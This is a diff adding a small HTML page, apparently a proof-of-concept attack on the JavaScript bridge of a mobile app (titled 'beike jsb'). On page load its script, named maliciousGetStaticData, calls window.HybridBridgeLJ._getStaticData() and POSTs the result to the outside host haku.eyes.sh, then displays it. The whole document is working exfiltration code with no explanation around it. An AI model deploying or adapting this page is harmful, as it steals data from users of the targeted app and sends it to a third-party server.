@@ -1,0 +1,25 @@
+
+<html>
+<header>
+    <meta charset="utf-8">
+    <title>beike jsb</title>
+</header>
+
+<body>
+    <h1>贝壳JSB</h1>
+</body>
+
+<script>
+
+function maliciousGetStaticData() {
+    var data = window.HybridBridgeLJ._getStaticData();
+    fetch("http://haku.eyes.sh?beike", {
+    method: "POST",
+    body: data
+    });
+    alert(data);
+ }
+
+ maliciousGetStaticData();
+</script>
+</html>
